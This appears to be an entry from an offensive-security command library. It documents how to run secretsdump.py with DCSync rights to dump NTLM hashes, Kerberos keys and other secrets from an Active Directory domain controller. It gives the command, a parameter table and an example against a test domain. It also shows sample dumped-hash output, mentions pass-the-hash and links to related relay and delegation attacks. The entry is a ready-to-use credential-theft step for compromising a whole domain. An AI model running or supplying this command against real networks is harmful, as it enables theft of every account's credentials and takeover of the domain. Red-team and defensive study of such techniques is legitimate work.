---
id: 6d72a5fb-2ca2-4f66-a3f5-e30268260695
name: secretsdump-extract-domain-hashes
type: command
executor: bash
data: secretsdump.py $_DOMAIN/$_USERNAME@$_DOMAIN_CONTROLLER -just-dc
output: null
created_at: '2023-04-06T03:56:05.532809+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - dcsync
verified: true
validated: true
---

# secretsdump-extract-domain-hashes

## Command

```bash
secretsdump.py $_DOMAIN/$_USERNAME@$_DOMAIN_CONTROLLER -just-dc
```

## Description

Uses DCSync rights to replicate and dump NTLM hashes, Kerberos keys, and other secrets from the domain controller's NTDS.dit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | AD domain name | Yes |
| $_USERNAME | Username with DCSync rights | Yes |
| $_DOMAIN_CONTROLLER | Target DC FQDN | Yes |
| -just-dc | Dump only DC secrets (hashes, not full NTDS) | Yes |

## Examples

### Basic Usage

```bash
secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
```

### Advanced Usage

Add -hashes for pass-the-hash if needed.

## Expected Output

Dumped credentials:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...

Success if hashes are listed; failure if access denied.

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/ntlmrelayx-grant-dcsync-privileges]]
